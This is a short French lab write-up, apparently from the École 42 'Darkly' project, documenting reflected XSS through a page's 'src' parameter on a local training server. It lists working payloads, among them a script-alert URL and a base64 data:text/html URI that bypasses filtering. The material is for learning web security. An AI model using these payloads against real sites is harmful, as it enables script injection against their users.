# Darkly - École 42

## 11. XSS - src=nsa

- Sur la page d'accueil, on clique sur le logo de la NSA

view-source:http://10.12.200.47/index.php?page=media&src=nsa

```
<object data="http://10.12.200.47/images/nsa_prism.jpg"></object>
```

view-source:http://10.12.200.47/index.php?page=media&src=qwerty

404

```
<object data="qwerty"></object>
```

```
http://10.12.200.47/index.php?page=media&src=<h1 style="color:red;"><u>test</u></h1>
http://10.12.200.47/index.php?page=media&src=<script>alert("Coucou");</script>
```

Trouve sur : https://owasp.org/www-community/attacks/xss/ : XSS Using Code Encoding : We may encode our script in base64

```
http://10.12.200.47/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
```

c'est `<script>alert('test3')</script>` encode en base 64
